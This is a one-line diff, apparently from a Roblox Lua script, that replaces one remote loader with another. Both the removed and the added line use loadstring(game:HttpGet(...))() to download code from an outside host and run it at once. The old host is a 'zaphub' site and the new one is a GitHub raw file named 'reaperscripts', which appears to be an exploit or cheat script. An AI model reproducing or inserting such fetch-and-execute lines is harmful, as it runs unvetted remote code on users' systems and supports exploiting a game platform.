@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Melor133/Script/refs/heads/main/reaperscripts"))()
